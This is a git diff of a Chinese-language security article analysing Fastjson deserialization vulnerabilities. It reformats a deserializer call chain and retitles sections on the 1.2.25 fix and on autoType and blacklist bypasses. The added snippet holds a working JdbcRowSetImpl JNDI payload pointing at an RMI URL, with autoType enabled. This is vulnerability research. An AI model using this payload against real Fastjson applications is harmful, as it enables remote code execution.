@@ -278,16 +278,16 @@ JSON#parseObject(String text)
 								ParserConfig#createJavaBeanDeserializer(Class<?> clazz, Type type) # 创建一个反序列化器
 									JavaBeanDeserializer#JavaBeanDeserializer(ParserConfig config, Class<?> clazz, Type type)
 										JavaBeanInfo#build(Class<?> clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) # 获取了类的构造方法、属性，依次从类的setXxx、类的public属性、类的满足特定要求的getXxx获取反序列化器
-							JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName) # 反序列化json对象
-								JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName, int features)
-									JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features) # 反序列化json对象，包含实例化类，和从json中反序列化类的属性
-										JavaBeanDeserializer#createInstance(DefaultJSONParser parser, Type type) # 实例化类，后面解析json属性，基本类型直接setValue赋值，非基本属性还需要反序列化
-											DefaultFieldDeserializer#parseField(DefaultJSONParser parser, Object object, Type objectType, Map<String, Object> fieldValues)  # 从json字符串中解析到非基本类型的属性，无法直接赋值，需要通过反序列化器进行解析。先获取反序列化器，再反序列化对象，再通过setValue赋值
-												DefaultFieldDeserializer#getFieldValueDeserilizer(ParserConfig config) # 获取反序列化器
-												JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName, int features) # 反序列化对象
-												DefaultFieldDeserializer#setValue(Object object, Object value) # 赋值
+						JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName) # 反序列化json对象
+							JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName, int features)
+								JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features) # 反序列化json对象，包含实例化类，和从json中反序列化类的属性
+									JavaBeanDeserializer#createInstance(DefaultJSONParser parser, Type type) # 实例化类，后面解析json属性，基本类型直接setValue赋值，非基本属性还需要反序列化
+										DefaultFieldDeserializer#parseField(DefaultJSONParser parser, Object object, Type objectType, Map<String, Object> fieldValues)  # 从json字符串中解析到非基本类型的属性，无法直接赋值，需要通过反序列化器进行解析。先获取反序列化器，再反序列化对象，再通过setValue赋值
+											DefaultFieldDeserializer#getFieldValueDeserilizer(ParserConfig config) # 获取反序列化器
+											JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName, int features) # 反序列化对象
+											DefaultFieldDeserializer#setValue(Object object, Object value) # 赋值
 												
-											DefaultFieldDeserializer#setValue(Object object, Object value) # 通过反射，或者通过先前获取反序列化器中的函数赋值																																
+										DefaultFieldDeserializer#setValue(Object object, Object value) # 通过反射，或者通过先前获取反序列化器中的函数赋值															
 ```
 
 **对不带@type的json字符串进行反序列化**
@@ -779,9 +779,15 @@ public class Test {
 
 #### Fastjson 1.2.25的修复分析
 
-  Fastjson在1.2.25针对反序列化漏洞进行了第一次修复，确立了修复的方式是采用关闭autoType和黑名单，虽然后续出现了很多绕过手法，但后续的修复方式也是基于第一次修复缝缝补补。
+  Fastjson在1.2.25针对反序列化漏洞进行了第一次修复，确立了修复的方式是采用**默认关闭autoType和黑名单**，虽然后续出现了很多绕过手法，但后续的修复方式也是基于第一次修复缝缝补补。
 
-##### autoType的关闭和黑名单
+##### autoType开启的情况下绕过黑名单
+
+```java
+String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
 
   在<=Fastjson 1.2.24时是默认开启autoType的，在之后都设置为默认关闭。注意到下列变化，loadClass变为了checkAutoType，这个变化很关键
 
@@ -886,7 +892,7 @@ public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
 }
 ```
 
-##### fastjson绕过黑名单
+##### autoType默认关闭的情况下绕过autoType和黑名单
 
 我们还使用之前的Payload打一下
 
@@ -895,7 +901,7 @@ String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName
 
 ```
 
-##### fastjson缓存机制和利用
+
 
 #### 1.2.25<=Fastjson<=1.2.41
 
